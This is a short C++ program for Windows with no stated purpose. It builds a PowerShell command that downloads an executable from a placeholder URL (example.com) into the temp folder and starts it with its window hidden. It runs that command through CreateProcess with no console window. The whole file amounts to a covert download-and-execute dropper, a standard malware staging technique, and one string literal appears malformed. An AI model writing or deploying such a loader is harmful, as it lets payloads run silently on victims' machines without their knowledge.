#include <Windows.h>
#include <iostream>
#include <string>

int main()
{
    // PowerShell command
    std::string command = "powershell -Command \"$url = 'https://example.com/file.exe'; "
                         "$output = '$env:temp\\file.exe'; "
                         "$wc = New-Object System.Net.WebClient; "
                         "$wc.DownloadFile($url, $output); "
                         "Start-Process -FilePath $output -WindowStyle Hidden -NoNewWindow -RedirectStandardOutput \"$env:temp\\stdout.log\" -RedirectStandardError \"$env:temp\\stderr.log\" -RedirectStandardInput \"$env:temp\\stdin.log"\"";

    // Create process with no console window
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags |= STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (CreateProcess(NULL, (LPSTR)command.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else {
        std::cout << "CreateProcess failed with error code: " << GetLastError() << std::endl;
    }

    return 0;
}
